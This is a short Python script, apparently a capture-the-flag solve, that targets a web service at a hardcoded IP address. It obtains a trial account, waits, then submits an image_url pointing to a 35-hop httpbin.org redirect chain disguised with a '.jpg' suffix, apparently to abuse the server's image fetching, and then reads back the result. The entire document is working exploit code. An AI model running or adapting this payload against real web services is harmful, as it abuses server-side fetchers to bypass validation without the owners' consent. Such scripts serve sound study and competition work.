import requests
import time

url = "http://35.200.21.52/"
trial = requests.get(url+'/trial').json()['url']
uid = trial.split('/')[-1]
print(uid)
r = requests.get(trial)
time.sleep(11)

data = {
    'id':uid,
    'password':'password',
    'image_url':'http://httpbin.org/redirect/35?.jpg'
}

r = requests.post(url,data=data)
r = requests.post(url+uid,data={'password':'password'})
print(r.text)
